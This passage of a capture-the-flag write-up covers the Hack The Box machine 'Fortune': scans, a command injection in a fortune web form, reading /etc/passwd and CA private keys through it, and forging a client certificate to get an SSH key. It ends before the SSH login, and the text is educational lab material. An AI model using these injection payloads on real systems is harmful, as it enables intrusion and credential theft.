<li><a href="#2nd-enumeration-having-ntfuser-authenticated-to-authpf-via-ssh">2nd Enumeration (having ntfuser authenticated to authpf via ssh)</a></li>
<li><a href="#spoofing-uid-gid-using-nfsshell">Spoofing uid/gid using nfsshell</a></li>
<li><a href="#getting-charlie-shell">Getting charlie shell</a></li>
<li><a href="#privilege-escalation">Privilege escalation</a></li>
</ul></li>
<li><a href="#bonus-script-rce2shell-py">Bonus script: rce2shell.py</a></li>
 
      
        <li><a href="#posts-section"><span lang="en">See also</span><span lang="el">Δείτε επίσης</span></a></li>
      </ul>
    </li>
   </ul>
  
   
  <ul class="nav nav-pills">
      <li><a class="p-logo" href="https://alamot.github.io/"><i class="fa fa-home" aria-hidden="true"></i> <span class="hidden768" lang="en">The Portal of Knowledge</span><span class="hidden768" lang="el">Η Πύλη της Γνώσης</span></a></li>
  </ul>
  
  <ul class="nav nav-pills pull-right topmargin7"> 
    <li id="lang-selector" role="presentation" class="dropdown">
      <a id="lang-index" class="dropdown-toggle btn-primary" data-toggle="dropdown" href="#" role="button" aria-haspopup="true" aria-expanded="false">Language <i class="fa fa-caret-down" aria-hidden="true"></i></a>
      <ul class="dropdown-menu">
        <li><a id="en" href="#">English</a></li>
        <li><a id="el" href="#">Ελληνικά</a></li>
      </ul>
    </li>  
  </ul>
</div>
</nav>
<script>
langtext = "English";
language = localStorage.getItem('language');
if (language) {
  document.getElementById('mainbody').setAttribute('class', language);
  document.getElementById('mainbody').setAttribute('lang', language);
  if (language == 'el') { langtext="Ελληνικά"; }
  document.getElementById("lang-index").innerHTML=langtext+' <i class="fa fa-caret-down" aria-hidden="true"></i>';
}
</script>




<div class="container-fluid">
  <div class="row">
    <div class="col-md-12">
      <article class="single centered">
        <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
        <div class="body">
            <header lang="en"><h1 id="title" class="title">Fortune (Hack The Box) write-up</h1></header>
            <header lang="el"><h1 class="title">Ανάλυση του Fortune (Hack The Box)</h1></header>
            <i class="fa fa-calendar topmargin7"  aria-hidden="true"></i>  
            <time lang="en" class="topmargin7">02 Aug 2019</time>
            <time lang="el" class="topmargin7">02 Αυγ 2019</time>
            &middot; <i class="fa fa-folder-open-o topmargin7" aria-hidden="true"></i>
            
              <a class="label label-success topmargin7" href='https://alamot.github.io/categories/cybersecurity'>
                <span lang="en">Cybersecurity</span>
                <span lang="el">Κυβερνοασφάλεια</span>
              </a>
            
            &middot; <i class="fa fa-tags topmargin7" aria-hidden="true"></i>
            
              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/hackthebox'>
                <span lang="en">hackthebox</span>
                <span lang="el">hackthebox</span>
                </a>
            
              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/bsd'>
                <span lang="en">bsd</span>
                <span lang="el">bsd</span>
                </a>
            
         
         <aside>
          <section>
            <header lang="en"><h2>Contents</h2></header>
            <header lang="el"><h2>Περιεχόμενα</h2></header>
            <div><nav id="TableOfContents">
<ul>
<li><a href="#introduction">Introduction</a></li>
<li><a href="#enumeration">Enumeration</a>
<ul>
<li><a href="#port-scanning">Port scanning</a></li>
<li><a href="#port-80">Port 80</a></li>
<li><a href="#port-443">Port 443</a></li>
</ul></li>
<li><a href="#exploitation">Exploitation</a>
<ul>
<li><a href="#gaining-rce-due-to-command-injection">Gaining RCE due to command Injection</a></li>
<li><a href="#acquiring-a-client-certificate">Acquiring a client certificate</a></li>
<li><a href="#ssh-authentication-to-authpf">SSH authentication to authpf</a></li>
<li><a href="#2nd-enumeration-having-ntfuser-authenticated-to-authpf-via-ssh">2nd Enumeration (having ntfuser authenticated to authpf via ssh)</a></li>
<li><a href="#spoofing-uid-gid-using-nfsshell">Spoofing uid/gid using nfsshell</a></li>
<li><a href="#getting-charlie-shell">Getting charlie shell</a></li>
<li><a href="#privilege-escalation">Privilege escalation</a></li>
</ul></li>
<li><a href="#bonus-script-rce2shell-py">Bonus script: rce2shell.py</a></li>
</ul>
</nav></div>
          </section>
         </aside>
        
        

<h1 id="introduction">Introduction</h1>

<p>Fortune is an insane difficulty OpenBSD box which hosts a web app vulnerable to RCE. Using the RCE the CA key can be read, which is used to create HTTPS client certificates. The client certificate leads to an SSH login, which helps to bypass the firewall. This allows mounting of an NFS share and dropping a suid to be executed as the user. An application is found to be using faulty encryption logic, which allows for escalation of privileges to root.</p>

<p><a href="https://www.hackthebox.com/machines/fortune" target="_blank">https://www.hackthebox.com/machines/fortune</a></p>

<h1 id="enumeration">Enumeration</h1>

<h2 id="port-scanning">Port scanning</h2>

<p>Let&rsquo;s scan the full range of TCP and UDP ports using my tool <a href="https://github.com/Alamot/code-snippets/blob/master/enum/htbscan.py" target="_blank">htbscan.py</a></p>

<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo htbscan.py 10.10.10.127
</span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Running command: sudo masscan -e tun0 -p0-65535 --max-rate 500 --interactive 10.10.10.127
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-03-12 09:10:57 GMT
</span></span></span><span class="line"><span class="cl"><span class="go"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
</span></span></span><span class="line"><span class="cl"><span class="go">Initiating SYN Stealth Scan
</span></span></span><span class="line"><span class="cl"><span class="go">Scanning 1 hosts [65536 ports/host]
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 80/tcp on 10.10.10.127
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 22/tcp on 10.10.10.127
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 443/tcp on 10.10.10.127
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Running command: sudo nmap -A -p22,80,443 10.10.10.127
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-12 11:20 EET
</span></span></span><span class="line"><span class="cl"><span class="go">Nmap scan report for 10.10.10.127
</span></span></span><span class="line"><span class="cl"><span class="go">Host is up (0.059s latency).
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">PORT    STATE SERVICE    VERSION
</span></span></span><span class="line"><span class="cl"><span class="go">22/tcp  open  ssh        OpenSSH 7.9 (protocol 2.0)
</span></span></span><span class="line"><span class="cl"><span class="go">| ssh-hostkey:
</span></span></span><span class="line"><span class="cl"><span class="go">|   2048 07:ca:21:f4:e0:d2:c6:9e:a8:f7:61:df:d7:ef:b1:f4 (RSA)
</span></span></span><span class="line"><span class="cl"><span class="go">|   256 30:4b:25:47:17:84:af:60:e2:80:20:9d:fd:86:88:46 (ECDSA)
</span></span></span><span class="line"><span class="cl"><span class="go">|_  256 93:56:4a:ee:87:9d:f6:5b:f9:d9:25:a6:d8:e0:08:7e (ED25519)
</span></span></span><span class="line"><span class="cl"><span class="go">80/tcp  open  http       OpenBSD httpd
</span></span></span><span class="line"><span class="cl"><span class="go">|_http-server-header: OpenBSD httpd
</span></span></span><span class="line"><span class="cl"><span class="go">|_http-title: Fortune
</span></span></span><span class="line"><span class="cl"><span class="go">443/tcp open  ssl/https?
</span></span></span><span class="line"><span class="cl"><span class="go">|_ssl-date: TLS randomness does not represent time
</span></span></span><span class="line"><span class="cl"><span class="go">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
</span></span></span><span class="line"><span class="cl"><span class="go">Aggressive OS guesses: OpenBSD 4.0 (95%), OpenBSD 4.4 - 4.5 (95%), OpenBSD 6.0 - 6.1 (94%), OpenBSD 5.0 (94%), OpenBSD 5.0 - 5.8 (94%), OpenBSD 4.9 (93%), OpenBSD 4.6 (93%), FreeBSD 10.0-CURRENT (93%), OpenBSD 4.7 (92%), OpenBSD 6.0 (92%)
</span></span></span><span class="line"><span class="cl"><span class="go">No exact OS matches for host (test conditions non-ideal).
</span></span></span></code></pre></div></div>

<h2 id="port-80">Port 80</h2>

<p>Let&rsquo;s brute-force directories and files on port 80 using gobuster:</p>

<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> gobuster -u http://10.10.10.127 -w /opt/DirBuster/directory-list-2.3-medium.txt -t <span class="m">50</span>
</span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">=====================================================
</span></span></span><span class="line"><span class="cl"><span class="go">Gobuster v2.0.1              OJ Reeves (@TheColonial)
</span></span></span><span class="line"><span class="cl"><span class="go">=====================================================
</span></span></span><span class="line"><span class="cl"><span class="go">[+] Mode         : dir
</span></span></span><span class="line"><span class="cl"><span class="go">[+] Url/Domain   : http://10.10.10.127/
</span></span></span><span class="line"><span class="cl"><span class="go">[+] Threads      : 50
</span></span></span><span class="line"><span class="cl"><span class="go">[+] Wordlist     : /opt/DirBuster/directory-list-2.3-medium.txt
</span></span></span><span class="line"><span class="cl"><span class="go">[+] Status codes : 200,204,301,302,307,403
</span></span></span><span class="line"><span class="cl"><span class="go">[+] Timeout      : 10s
</span></span></span><span class="line"><span class="cl"><span class="go">=====================================================
</span></span></span><span class="line"><span class="cl"><span class="go">2019/03/12 11:34:11 Starting gobuster
</span></span></span><span class="line"><span class="cl"><span class="go">=====================================================
</span></span></span><span class="line"><span class="cl"><span class="go">/fortune (Status: 301)
</span></span></span><span class="line"><span class="cl"><span class="go">/select (Method not allowed)
</span></span></span></code></pre></div></div>

<h2 id="port-443">Port 443</h2>

<p>When we try to connect to port 443 (https), the browser ask us for a client certificate. We can run a <em>sslyze</em> scan to verify it and get more info:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sslyze --regular 10.10.10.127
</span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">...
</span></span></span><span class="line"><span class="cl"><span class="go"> CHECKING HOST(S) AVAILABILITY
</span></span></span><span class="line"><span class="cl"><span class="go"> -----------------------------
</span></span></span><span class="line"><span class="cl"><span class="go">   10.10.10.127:443                       =&gt; 10.10.10.127   WARNING: Server REQUIRED client authentication, specific plugins will fail.
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go"> SCAN RESULTS FOR 10.10.10.127:443 - 10.10.10.127
</span></span></span><span class="line"><span class="cl"><span class="go"> ------------------------------------------------
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go"> * Downgrade Attacks:
</span></span></span><span class="line"><span class="cl"><span class="go">       TLS_FALLBACK_SCSV:                 OK - Supported
</span></span></span><span class="line"><span class="cl"><span class="go"> * Deflate Compression:
</span></span></span><span class="line"><span class="cl"><span class="go">                                          OK - Compression disabled
</span></span></span><span class="line"><span class="cl"><span class="go"> * OpenSSL CCS Injection:
</span></span></span><span class="line"><span class="cl"><span class="go">                                          OK - Not vulnerable to OpenSSL CCS injection
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go"> * Certificate Information:
</span></span></span><span class="line"><span class="cl"><span class="go">     Content
</span></span></span><span class="line"><span class="cl"><span class="go">       SHA1 Fingerprint:                  f5528e05f76ef7013a6ce1b9888e60aa36c4e4a6
</span></span></span><span class="line"><span class="cl"><span class="go">       Common Name:                       fortune.htb
</span></span></span><span class="line"><span class="cl"><span class="go">       Issuer:                            Fortune Intermediate CA
</span></span></span><span class="line"><span class="cl"><span class="go">       Serial Number:                     4096
</span></span></span><span class="line"><span class="cl"><span class="go">       Not Before:                        2018-10-30 01:13:42
</span></span></span><span class="line"><span class="cl"><span class="go">       Not After:                         2019-11-09 01:13:42
</span></span></span><span class="line"><span class="cl"><span class="go">       Signature Algorithm:               sha256
</span></span></span><span class="line"><span class="cl"><span class="go">       Public Key Algorithm:              RSA
</span></span></span><span class="line"><span class="cl"><span class="go">       Key Size:                          2048
</span></span></span><span class="line"><span class="cl"><span class="go">       Exponent:                          65537 (0x10001)
</span></span></span><span class="line"><span class="cl"><span class="go">       DNS Subject Alternative Names:     []
</span></span></span><span class="line"><span class="cl"><span class="go">...
</span></span></span></code></pre></div></div></p>

<h1 id="exploitation">Exploitation</h1>

<h2 id="gaining-rce-due-to-command-injection">Gaining RCE due to command Injection</h2>

<p>If we visit <a href="http://10.10.10.127/" target="_blank">http://10.10.10.127/</a>, we see a form:
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;/select&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;radio&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;db&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;fortunes&#34;</span><span class="p">&gt;</span> fortunes<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;radio&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;db&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;fortunes2&#34;</span><span class="p">&gt;</span> fortunes2<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;radio&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;db&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;recipes&#34;</span><span class="p">&gt;</span> recipes<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;radio&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;db&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;startrek&#34;</span><span class="p">&gt;</span> startrek<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;radio&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;db&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;zippy&#34;</span><span class="p">&gt;</span> zippy<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Submit&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span></span></span></code></pre></div></p>

<p>The parameter &lsquo;db&rsquo; is vulnerable to command injection:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> curl -X POST http://10.10.10.127/select --data <span class="s1">&#39;db=whatever|id&#39;</span>
</span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">&lt;!DOCTYPE html&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">&lt;html&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">&lt;head&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">&lt;title&gt;Your fortune&lt;/title&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">&lt;meta name=&#39;viewport&#39; content=&#39;width=device-width, initial-scale=1&#39;&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">&lt;meta http-equiv=&#34;X-UA-Compatible&#34; content=&#34;IE=edge&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">&lt;/head&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">&lt;body&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">&lt;h2&gt;Your fortune is:&lt;/h2&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">&lt;p&gt;&lt;pre&gt;
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">uid=512(_fortune) gid=512(_fortune) groups=512(_fortune)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">&lt;/pre&gt;&lt;p&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">&lt;p&gt;Try &lt;a href=&#39;/&#39;&gt;again&lt;/a&gt;!&lt;/p&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">&lt;/body&gt;
</span></span></span></code></pre></div></div></p>

<p>Thus, we have gained Remote Command Execution to this machine.</p>

<p>Here is the relevant backend code (fortuned.py) for reference:
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">abort</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/select&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">fortuned</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">cmd</span> <span class="o">=</span> <span class="s1">&#39;/usr/games/fortune &#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">dbs</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;fortunes&#39;</span><span class="p">,</span> <span class="s1">&#39;fortunes2&#39;</span><span class="p">,</span> <span class="s1">&#39;recipes&#39;</span><span class="p">,</span> <span class="s1">&#39;startrek&#39;</span><span class="p">,</span> <span class="s1">&#39;zippy&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">selection</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;db&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">shell_cmd</span> <span class="o">=</span> <span class="n">cmd</span> <span class="o">+</span> <span class="n">selection</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">shell_cmd</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;display.html&#39;</span><span class="p">,</span> <span class="n">output</span><span class="o">=</span><span class="n">result</span><span class="p">)</span></span></span></code></pre></div></p>

<h2 id="acquiring-a-client-certificate">Acquiring a client certificate</h2>

<p>If we search a little the home folders, we find some private keys:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> curl --silent -X POST http://10.10.10.127/select --data <span class="s1">&#39;db=whatever|ls -al /home/bob/ca/intermediate/private/&#39;</span>
</span></span><span class="line"><span class="cl"><span class="go">...
</span></span></span><span class="line"><span class="cl"><span class="go">total 20
</span></span></span><span class="line"><span class="cl"><span class="go">drwxr-xr-x  2 bob  bob   512 Oct 29  2018 .
</span></span></span><span class="line"><span class="cl"><span class="go">drwxr-xr-x  7 bob  bob   512 Nov  3  2018 ..
</span></span></span><span class="line"><span class="cl"><span class="go">-r--------  1 bob  bob  1675 Oct 29  2018 fortune.htb.key.pem
</span></span></span><span class="line"><span class="cl"><span class="go">-rw-r--r--  1 bob  bob  3243 Oct 29  2018 intermediate.key.pem
</span></span></span><span class="line"><span class="cl"><span class="go">...
</span></span></span></code></pre></div></div></p>

<p>Well, we don&rsquo;t have permissions to read fortune.htb.key.pem, but we can read intermediate.key.pem:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> curl --silent -X POST http://10.10.10.127/select --data <span class="s1">&#39;db=whatevat|cat /home/bob/ca/intermediate/private/intermediate.key.pem&#39;</span> <span class="p">|</span> grep -zo <span class="s1">&#39;\-\-.*\-\-&#39;</span> &gt; intermediate.key.pem
</span></span></code></pre></div></div></p>

<p>Inside /home/bob/ca/intermediate/certs/ there is the respective certificate:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> curl --silent -X POST http://10.10.10.127/select --data <span class="s1">&#39;db=whatever|cat /home/bob/ca/intermediate/certs/intermediate.cert.pem&#39;</span> <span class="p">|</span> grep -zo <span class="s1">&#39;\-\-.*\-\-&#39;</span> &gt; intermediate.cert.pem
</span></span></code></pre></div></div></p>

<p>We can combine the certificate and private key to a pkcs#12 file which we can import to our browser:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> openssl pkcs12 -inkey intermediate.key.pem -in intermediate.cert.pem -export -out client.p12
</span></span><span class="line"><span class="cl"><span class="go">Enter Export Password: pass
</span></span></span><span class="line"><span class="cl"><span class="go">Verifying - Enter Export Password: pass
</span></span></span></code></pre></div></div></p>

<p>Now, let&rsquo;s import client.p12 to your browser and visit <a href="https://10.10.10.147" target="_blank">https://10.10.10.147</a> (When we are being asked for it, we choose our recently imported client certificate. We also have to add an exception for the self-signed certificate of the website server). If we want to use curl the following command is sufficient:</p>

<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> curl --insecure --key intermediate.key.pem --cert intermediate.cert.pem https://10.10.10.127
</span></span></code></pre></div></div>

<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Elevated network access<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;viewport&#39;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#39;width=device-width, initial-scale=1&#39;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;X-UA-Compatible&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;IE=edge&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">You will need to use the local authpf service to obtain
</span></span><span class="line"><span class="cl">elevated network access. If you do not already have the appropriate
</span></span><span class="line"><span class="cl">SSH key pair, then you will need to <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#39;/generate&#39;</span><span class="p">&gt;</span>generate<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">one and configure your local system appropriately to proceed.
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span></span></span></code></pre></div>

<h2 id="ssh-authentication-to-authpf">SSH authentication to authpf</h2>

<p>It works! If we visit <a href="https://10.10.10.127/generate" target="_blank">https://10.10.10.127/generate</a> we see that:
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">AuthPF SSH Access
</span></span><span class="line"><span class="cl">The following public key has been added to the database of authorized keys:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5mx7yvTtW2FYsO+zwdqePx+44nyc+PnzD/4u+vS3nEIyQMUqeKKIFBMLNiKLnMfCUb4KZWm9r4qG45NWSITDF7t70z1co4ZrDz5wyLhQxZiZ2ZK9AzIzFECfYTFCMiLO7WAWS2fyK/KiYftFo6BNySgI/+tRuzZmaqbNqkjwF7o1ppaHUS415stjzNm+ohhMtVY5gDxsJen/aYzyPYH/ac4LOHNWqnxE1m21qyITGOQlCOjOP4wVfHbaT7mTBUSPDuHnA68WdAV0hwIKNOSFz/KiMA9yqbA7Tswpv2njS9FTta+yfeIcDdNcio5OVr5FrEpiljL88LIwXz1uoC5yL
</span></span><span class="line"><span class="cl">The corresponding private key is as follows:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-----BEGIN RSA PRIVATE KEY-----
</span></span><span class="line"><span class="cl">MIIEowIBAAKCAQEAuZse8r07VthWLDvs8Hanj8fuOJ8nPj58w/+Lvr0t5xCMkDFK
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">BbDVIRZzFu/b5uxjITX6yCIu5Ylb6cnpqQ+sqwYbYQm1HJ6PRhwj
</span></span><span class="line"><span class="cl">-----END RSA PRIVATE KEY-----
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Please save the above key pair to your local system with appropriate file permissions and use your OpenSSH client with the -i option to obtain elevated network access to the server.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Please note: If the IP address of your local system changes, then you may need to generate a new key pair.</span></span></code></pre></div></p>

<p>We can copy this private key and paste it into a file, but -as you have noticed- I prefer doing things a bit differently (^_^):
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> curl --silent --insecure --key intermediate.key.pem --cert intermediate.cert.pem https://10.10.10.127/generate <span class="p">|</span> grep -zo <span class="s1">&#39;\-\-.*\-\-&#39;</span> &gt; fortune_id_rsa
</span></span></code></pre></div></div></p>

<p>Don&rsquo;t forget to set the required strict permissions:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">chmod 600 fortune_id_rsa
</span></span></span></code></pre></div></div></p>

<p>But for whom user is this key? Let&rsquo;s examine /etc/passwd
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> curl -X POST http://10.10.10.127/select --data <span class="s1">&#39;db=whatever|cat /etc/passwd&#39;</span>
</span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">root:*:0:0:Charlie &amp;amp;:/root:/bin/ksh
</span></span></span><span class="line"><span class="cl"><span class="go">...
</span></span></span><span class="line"><span class="cl"><span class="go">charlie:*:1000:1000:Charlie:/home/charlie:/bin/ksh
</span></span></span><span class="line"><span class="cl"><span class="go">bob:*:1001:1001::/home/bob:/bin/ksh
</span></span></span><span class="line"><span class="cl"><span class="go">nfsuser:*:1002:1002::/home/nfsuser:/usr/sbin/authpf
</span></span></span></code></pre></div></div></p>

<p>We notice that one user has been set for authpf as his user shell. Let&rsquo;s see what happens if we try to connect using this <strong><em>nfsuser</em></strong> user and the private key we acquired:
